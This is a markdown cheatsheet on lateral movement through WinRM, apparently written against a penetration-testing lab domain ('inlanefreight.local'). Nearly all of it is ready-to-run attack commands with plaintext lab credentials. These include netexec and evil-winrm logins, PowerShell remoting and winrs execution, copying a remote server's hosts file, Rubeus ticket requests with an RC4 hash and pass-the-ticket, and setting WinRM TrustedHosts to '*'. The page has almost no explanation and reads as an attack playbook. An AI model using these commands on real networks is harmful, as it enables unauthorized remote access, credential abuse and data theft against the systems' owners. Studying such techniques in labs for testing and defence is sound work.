## Lateral movement winrm command cheatsheet. 


- netexec 

` netexec winrm 10.129.229.244 -u frewdy -p Kiosko093 ` 

![Commands](/Winrm-cheatsheet/images/netexec.png) 

- RDP Remote Resktop Protocol 

` xfreerdp /v:10.129.229.244 /u:Helen /p:RedRiot88 /dynamic-resolution /drive:tmp,/home/kali/Tools /d:inlanefreight.local -clipboard /cert:ignore -wallpaper -themes +auto-reconnect ` 


- Powershell Commands

![Commands](/Winrm-cheatsheet/images/powershell-1.png) 

```
PS C:\Tools> Invoke-Command -ComputerName srv02 -ScriptBlock { hostname;whoami } 

PS C:\Tools> $username = "INLANEFREIGHT\Helen"
PS C:\Tools> $password = "RedRiot88"
PS C:\Tools> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Tools> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\Tools> Invoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname } 
PS C:\Tools> winrs -r:srv02 "powershell -c whoami;hostname" 
PS C:\Tools> winrs /remote:srv02 /username:helen /password:RedRiot88 "powershell -c whoami;hostname"


```

Note: If we use the IP instead of the computer name, we must use explicit credentials, or alternatively, we can use the flag -Authentication Negotiate instead of providing explicit credentials. 


![Commands](/Winrm-cheatsheet/images/pwsh-1.png) 


- Powershell Copy Files 

```

	PS C:\Tools> $sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential 
	PS C:\Tools> Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\helen\Desktop\Sample.txt' -Destination 'C:\Users\helen\Desktop\Sample.txt' -Verbose 
	PS C:\Tools> Copy-Item -FromSession $sessionSRV02 -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\Users\helen\Desktop\host.txt' -Verbose 

```


![Commands](/Winrm-cheatsheet/images/pwsh-2.png) 


- Interactive Shell 

` PS C:\Tools> Enter-PSSession $sessionSRV02` 


![Commands](/Winrm-cheatsheet/images/pwsh-3.png) 


- Rubeus & WinRM 

![Commands](/Winrm-cheatsheet/images/rub-1.png) 

![Commands](/Winrm-cheatsheet/images/rub-2.png) 

![Commands](/Winrm-cheatsheet/images/rub-3.png) 

![Commands](/Winrm-cheatsheet/images/rub-4.png) 

![Commands](/Winrm-cheatsheet/images/rub-5.png) 


```

PS C:\Tools>  .\Rubeus.exe asktgt /user:leonvqz /rc4:3223DS033D176ABAAF6BEAA0AA681400 /nowrap 
PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show
PS C:\Tools> .\Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9h...SNIP... 
PS C:\Tools> Enter-PSSession SRV02.inlanefreight.local -Authentication Negotiate 
[SRV02.inlanefreight.local]: PS C:\Users\Leonvqz\Documents> hostname 
PS C:\Tools> Set-Item WSMan:localhost\client\trustedhosts -value * -Force 

```

![Commands](/Winrm-cheatsheet/images/evil.png) 

### Lateral Movement from Linux 


```

$ netexec winrm 10.129.229.244 -u frewdy -p Kiosko093 -x "ipconfig" 

$ evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093 
$ evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093 -s '/home/kali/Tools/' 
$ PowerView.ps1 
$ menu

```

- PowerShell over the web

https://10.129.229.244/pswa/en-US/logon.aspx

![Commands](/Winrm-cheatsheet/images/web.png) 
